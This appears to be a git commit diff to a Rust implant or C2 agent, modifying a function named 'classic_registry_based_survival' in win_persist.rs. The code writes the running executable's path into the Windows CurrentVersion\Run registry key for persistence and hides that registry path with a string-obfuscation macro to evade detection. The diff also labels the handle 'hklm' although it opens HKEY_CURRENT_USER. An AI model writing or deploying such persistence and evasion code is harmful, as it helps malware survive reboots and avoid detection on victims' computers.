8d7069d1da5bc444beb2306fa4f25b56f9002bb1
= <zarkones.xena@gmail.com>
2025-05-29 00:01:28 +0200

    wip

--- agent/src/win_persist.rs
+++ agent/src/win_persist.rs
@@ -4,6 +4,8 @@ use winreg::enums::*;
 use winreg::RegKey;
 use goldberg::goldberg_string;
 
+use crate::debug_println;
+
 #[inline]
 pub fn classic_registry_based_survival(program_name: &str) -> Result<(), Box<dyn std::error::Error>> {
     if env::consts::OS != "windows" {
@@ -15,13 +17,18 @@ pub fn classic_registry_based_survival(program_name: &str) -> Result<(), Box<dyn
     }
 
     let exe_path: PathBuf = env::current_exe()?;
-
-    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
-    let path = goldberg_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
-    let (key, _) = hkcu.create_subkey(path)?;
-
     let exe_path_str = exe_path.to_str().ok_or("Failed to convert path to string")?;
-    key.set_value(program_name, &exe_path_str)?;
 
-    Ok(())
+    let hklm = RegKey::predef(HKEY_CURRENT_USER);
+
+    let run_path = goldberg_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
+
+    match hklm.create_subkey(&run_path) {
+        Err(e) => Err(Box::new(e) as Box<dyn std::error::Error>),
+        Ok((key, _disp)) => {
+            key.set_value(program_name, &exe_path_str)?;
+            debug_println!("Set persistence in Run path: {}", run_path);
+            Ok(())
+        }
+    }
 }
